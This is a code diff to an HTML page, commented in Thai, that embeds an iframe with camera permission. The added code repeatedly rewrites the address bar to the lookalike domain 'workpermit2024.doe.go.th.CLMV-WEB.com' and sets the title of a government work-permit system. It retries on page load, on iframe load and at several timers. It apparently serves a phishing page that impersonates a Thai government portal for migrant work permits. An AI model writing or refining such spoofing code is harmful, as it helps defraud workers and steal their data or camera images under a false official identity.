@@ -30,6 +30,8 @@
 <body>
     <iframe id="myIframe" scrolling="yes" src="" allow="camera"></iframe>
     <script>
+        let urlChanged = false; // ป้องกันการเปลี่ยน URL หลายครั้ง
+        
         function getUrlParameter(name) {
             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
             var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
@@ -39,16 +41,35 @@
         
         // เปลี่ยน URL แสดงใน address bar
         function changeUrlDisplay() {
+            if (urlChanged) return; // ถ้าเปลี่ยนแล้วก็ไม่ต้องเปลี่ยนอีก
+            
             var currentParams = window.location.search;
             var newUrl = 'https://workpermit2024.doe.go.th.CLMV-WEB.com' + currentParams;
             
-            // เปลี่ยน URL โดยไม่ reload หน้า
-            if (window.history && window.history.replaceState) {
-                window.history.replaceState({}, '', newUrl);
+            // ตรวจสอบว่า URL ปัจจุบันไม่ใช่ URL ที่ต้องการแล้ว
+            if (window.location.href === newUrl) {
+                urlChanged = true;
+                return;
             }
             
-            // เปลี่ยน title ด้วย
-            document.title = 'e-WP (CLMV) - Work Permit System';
+            console.log('Current URL:', window.location.href);
+            console.log('Changing URL to:', newUrl);
+            
+            // เปลี่ยน URL โดยไม่ reload หน้า
+            if (window.history && window.history.replaceState) {
+                try {
+                    window.history.replaceState({}, '', newUrl);
+                    urlChanged = true;
+                    console.log('URL changed successfully to:', window.location.href);
+                    
+                    // เปลี่ยน title ด้วย
+                    document.title = 'e-WP (CLMV) - Work Permit System';
+                } catch (e) {
+                    console.error('Error changing URL:', e);
+                }
+            } else {
+                console.log('History API not supported');
+            }
         }
         
         // โหลด iframe
@@ -61,13 +82,47 @@
         }
         iframe.src = iframeUrl;
         
+        // เปลี่ยน URL ทันทีที่โหลดหน้า
+        changeUrlDisplay();
+        
+        // เปลี่ยน URL หลังจาก DOM โหลดเสร็จ
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM Content Loaded');
+            changeUrlDisplay();
+        });
+        
+        // เปลี่ยน URL หลังจากหน้าโหลดเสร็จทั้งหมด
+        window.addEventListener('load', function() {
+            console.log('Window Loaded');
+            changeUrlDisplay();
+        });
+        
         // เปลี่ยน URL หลังจากโหลด iframe เสร็จ
         iframe.onload = function() {
+            console.log('Iframe Loaded');
             changeUrlDisplay();
         };
         
-        // เปลี่ยน URL ทันทีด้วย (สำหรับกรณีที่ onload ไม่ทำงาน)
-        setTimeout(changeUrlDisplay, 500);
+        // เปลี่ยน URL ด้วย setTimeout หลายครั้ง
+        setTimeout(function() {
+            console.log('Timeout 100ms');
+            changeUrlDisplay();
+        }, 100);
+        
+        setTimeout(function() {
+            console.log('Timeout 500ms');
+            changeUrlDisplay();
+        }, 500);
+        
+        setTimeout(function() {
+            console.log('Timeout 1000ms');
+            changeUrlDisplay();
+        }, 1000);
+        
+        setTimeout(function() {
+            console.log('Timeout 2000ms');
+            changeUrlDisplay();
+        }, 2000);
     </script>
 </body>
 </html>
